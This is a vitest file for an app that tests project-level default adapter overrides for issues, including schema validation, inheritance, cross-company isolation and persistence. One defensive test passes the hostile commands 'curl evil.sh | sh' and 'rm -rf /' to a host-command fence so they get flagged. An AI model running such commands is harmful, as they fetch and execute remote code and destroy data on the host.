import { randomUUID } from "node:crypto";
import { eq } from "drizzle-orm";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  activityLog,
  agents,
  companies,
  createDb,
  instanceSettings,
  issueComments,
  issues,
  projectWorkspaces,
  projects,
} from "@paperclipai/db";
import { updateProjectSchema } from "@paperclipai/shared";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { issueService } from "../services/issues.ts";
import { projectService } from "../services/projects.ts";
import { collectProjectDefaultAssigneeAdapterOverridesCommandPaths } from "../routes/workspace-command-authz.ts";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

if (!embeddedPostgresSupport.supported) {
  console.warn(
    `Skipping embedded Postgres project-default adapter-override tests on this host: ${
      embeddedPostgresSupport.reason ?? "unsupported environment"
    }`,
  );
}

describe("project defaultAssigneeAdapterOverrides validation", () => {
  it("accepts the same shape as the per-issue override column", () => {
    const parsed = updateProjectSchema.parse({
      defaultAssigneeAdapterOverrides: { useProjectWorkspace: false },
    });
    expect(parsed.defaultAssigneeAdapterOverrides).toEqual({ useProjectWorkspace: false });
  });

  it("accepts null so a project can clear its default", () => {
    expect(
      updateProjectSchema.parse({ defaultAssigneeAdapterOverrides: null })
        .defaultAssigneeAdapterOverrides,
    ).toBeNull();
  });

  it("rejects keys the per-issue override column would reject", () => {
    expect(() =>
      updateProjectSchema.parse({
        defaultAssigneeAdapterOverrides: { useProjectWorkspace: false, notAThing: true },
      }),
    ).toThrow();
  });
});

describe("project default adapter-override host command fence", () => {
  it("reports the same host-executed command paths the per-issue field fences", () => {
    expect(
      collectProjectDefaultAssigneeAdapterOverridesCommandPaths({
        adapterConfig: {
          workspaceStrategy: {
            provisionCommand: "curl evil.sh | sh",
            teardownCommand: "rm -rf /",
          },
        },
      }),
    ).toEqual([
      "defaultAssigneeAdapterOverrides.adapterConfig.workspaceStrategy.provisionCommand",
      "defaultAssigneeAdapterOverrides.adapterConfig.workspaceStrategy.teardownCommand",
    ]);
  });

  it("reports nothing for a default that carries no host commands", () => {
    expect(
      collectProjectDefaultAssigneeAdapterOverridesCommandPaths({ useProjectWorkspace: false }),
    ).toEqual([]);
    expect(collectProjectDefaultAssigneeAdapterOverridesCommandPaths(null)).toEqual([]);
  });
});

describeEmbeddedPostgres("issuesSvc.create applies the project default adapter overrides", () => {
  let db!: ReturnType<typeof createDb>;
  let issuesSvc!: ReturnType<typeof issueService>;
  let projectsSvc!: ReturnType<typeof projectService>;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-project-default-overrides-");
    db = createDb(tempDb.connectionString);
    issuesSvc = issueService(db);
    projectsSvc = projectService(db);
  }, 30_000);

  afterEach(async () => {
    await db.delete(issueComments);
    await db.delete(activityLog);
    await db.delete(issues);
    await db.delete(projectWorkspaces);
    await db.delete(projects);
    await db.delete(agents);
    await db.delete(instanceSettings);
    await db.delete(companies);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function seedCompany() {
    const companyId = randomUUID();
    await db.insert(companies).values({
      id: companyId,
      name: "Blind Verification Co",
      issuePrefix: `BV${companyId.replace(/-/g, "").slice(0, 6).toUpperCase()}`,
    });
    return companyId;
  }

  async function seedProject(
    companyId: string,
    defaultAssigneeAdapterOverrides: Record<string, unknown> | null = null,
  ) {
    const projectId = randomUUID();
    await db.insert(projects).values({
      id: projectId,
      companyId,
      name: `Project ${projectId.slice(0, 8)}`,
      defaultAssigneeAdapterOverrides,
    });
    return projectId;
  }

  it("applies the project default when the caller supplies no overrides", async () => {
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, {
      title: "Blind verification pass",
      projectId,
    });

    expect(issue.assigneeAdapterOverrides).toEqual({ useProjectWorkspace: false });
  });

  it("treats an explicit null from the caller as no override supplied", async () => {
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, {
      title: "Explicit null",
      projectId,
      assigneeAdapterOverrides: null,
    });

    expect(issue.assigneeAdapterOverrides).toEqual({ useProjectWorkspace: false });
  });

  it("lets a caller-supplied override win over the project default", async () => {
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, {
      title: "Caller wins",
      projectId,
      assigneeAdapterOverrides: { useProjectWorkspace: true },
    });

    expect(issue.assigneeAdapterOverrides).toEqual({ useProjectWorkspace: true });
  });

  it("does not merge the project default into a partial caller override", async () => {
    // The default is replaced wholesale, not deep-merged: a caller that pins
    // only `adapterConfig` is stating the whole override, and silently folding
    // in `useProjectWorkspace` would change where its session runs.
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, {
      title: "Partial caller override",
      projectId,
      assigneeAdapterOverrides: { adapterConfig: { model: "claude-opus-5" } },
    });

    expect(issue.assigneeAdapterOverrides).toEqual({ adapterConfig: { model: "claude-opus-5" } });
  });

  it("is a no-op when the project has no default", async () => {
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, null);

    const issue = await issuesSvc.create(companyId, { title: "No project default", projectId });

    expect(issue.assigneeAdapterOverrides).toBeNull();
  });

  it("is a no-op for an empty project default object", async () => {
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, {});

    const issue = await issuesSvc.create(companyId, { title: "Empty project default", projectId });

    expect(issue.assigneeAdapterOverrides).toBeNull();
  });

  it("is a no-op for a project-less issue", async () => {
    const companyId = await seedCompany();
    await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, { title: "No project" });

    expect(issue.projectId).toBeNull();
    expect(issue.assigneeAdapterOverrides).toBeNull();
  });

  it("does not reach a same-named default in another company's project", async () => {
    const companyId = await seedCompany();
    const otherCompanyId = await seedCompany();
    const foreignProjectId = await seedProject(otherCompanyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, {
      title: "Cross-company project id",
      projectId: foreignProjectId,
    });

    expect(issue.assigneeAdapterOverrides).toBeNull();
  });

  it("does not apply the default on update when an issue is moved into the project later", async () => {
    // Create-only: the workspace resolver prefers the previous session's cwd, so
    // an override applied after the issue has already run would claim isolation
    // the transcript does not have.
    const companyId = await seedCompany();
    const projectId = await seedProject(companyId, { useProjectWorkspace: false });

    const issue = await issuesSvc.create(companyId, { title: "Moved in later" });
    expect(issue.assigneeAdapterOverrides).toBeNull();

    const updated = await issuesSvc.update(issue.id, { projectId });

    expect(updated?.projectId).toBe(projectId);
    expect(updated?.assigneeAdapterOverrides).toBeNull();
  });

  it("round-trips the default through the project service create, patch, and get", async () => {
    const companyId = await seedCompany();

    const created = await projectsSvc.create(companyId, {
      name: "Round trip",
      defaultAssigneeAdapterOverrides: { useProjectWorkspace: false },
    });
    expect(created.defaultAssigneeAdapterOverrides).toEqual({ useProjectWorkspace: false });

    const fetched = await projectsSvc.getById(created.id);
    expect(fetched?.defaultAssigneeAdapterOverrides).toEqual({ useProjectWorkspace: false });

    const cleared = await projectsSvc.update(created.id, { defaultAssigneeAdapterOverrides: null });
    expect(cleared?.defaultAssigneeAdapterOverrides).toBeNull();

    const persisted = await db
      .select({ value: projects.defaultAssigneeAdapterOverrides })
      .from(projects)
      .where(eq(projects.id, created.id))
      .then((rows) => rows[0]);
    expect(persisted?.value).toBeNull();
  });
});
